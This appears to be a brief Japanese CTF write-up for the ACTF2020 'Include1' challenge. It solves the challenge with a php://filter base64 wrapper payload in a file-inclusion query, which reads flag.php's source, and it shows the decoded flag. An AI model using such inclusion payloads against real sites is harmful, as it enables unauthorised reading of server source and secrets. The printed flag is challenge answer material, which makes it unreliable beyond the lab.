# [ACTF2020 新生赛]Include1

感谢 Y1ng 师傅供题。

## 解法

分からないので他の人のwriteupを読みました．

クエリに`?file=php://filter/convert.base64-encode/resource=flag.php` を追加する．

参考
> convert.base64-encode と convert.base64-decode による変換
これらのフィルタは、すべてのストリームデータに対してそれぞれbase64_encode() または base64_decode() 関数を適用するのと同じ動作をします。
https://www.php.net/manual/ja/filters.convert.php

すると，以下の文字列が得られる．

`PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7MDc5NzNkMTctMzdkYi00NWUwLWExOGEtZGZjZjA0OThmMzM0fQo=`

最後にbase64でデコードする．

```php
<?php
echo "Can you find out the flag?";
//flag{07973d17-37db-45e0-a18a-dfcf0498f334}
```

## FLAG

```bash
flag{07973d17-37db-45e0-a18a-dfcf0498f334}
```

## 参考

- https://icode.best/i/98998634702187
- https://teratail.com/questions/26704
